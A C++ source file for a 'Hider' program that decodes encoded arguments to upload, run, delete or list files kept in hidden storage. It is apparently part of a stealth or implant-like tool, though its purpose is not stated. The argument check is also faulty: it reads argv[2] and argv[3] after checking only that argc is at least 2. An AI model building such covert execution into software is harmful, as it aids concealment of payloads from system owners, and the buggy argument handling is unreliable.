#include "Hider.h"
#include "../ManegerAndHider/encoding.h"


Hider::Hider() : handel(HiddenFileHandler()) {}



// argv[] = {fncode, uploadLen, strParam};
uint Hider::manage_files(int argc, char* argv[])
{
	std::string line;
	if (argc < 2) {
		return HIDER_NO_ARGUMENTS_ERROR;
	}
	uint32_t fncode = decodeInt(std::string(argv[1]));
	uint32_t uploadLen = decodeInt(std::string(argv[2]));
	std::string stringParam = decodeStr(std::string(argv[3]));

	// TODO better Status handling
	Status res_upload = SUCCSESS;
	Status res_run = SUCCSESS;
	Status res_delete = SUCCSESS;

	if (fncode & HIDDEN_UPLOAD)
	{
		std::cerr << "start hidden uploading\n";
		res_upload = handel.writeFile(stringParam, uploadLen);
		std::cerr << "res_upload: " << res_upload << std::endl;

	}
	if ((fncode & HIDDEN_RUN) && res_upload == SUCCSESS) {
		std::cerr << "start hidden run\n";
		res_run = handel.runFile(stringParam);
		std::cerr << "res_run: " << res_run << std::endl;
	}

	if ((fncode & HIDDEN_DELETE) && res_upload == SUCCSESS) {
		std::cerr << "start hidden delete\n";
		res_delete = handel.deleteFile(stringParam);
		std::cerr << "res_delete: " << res_delete << std::endl;
	}

	if (fncode & HIDDEN_LIST) {
		handel.listFiles();
	}

	write(STDOUT_FILENO, &res_upload, sizeof(res_upload));
	write(STDOUT_FILENO, &res_run, sizeof(res_run));
	write(STDOUT_FILENO, &res_delete, sizeof(res_delete));

	return SUCCSESS;
}


int main(int argc, char** argv) {
	std::cerr << "start hider\n";
	
	Hider hider = Hider();	
	return hider.manage_files(argc, argv);
}

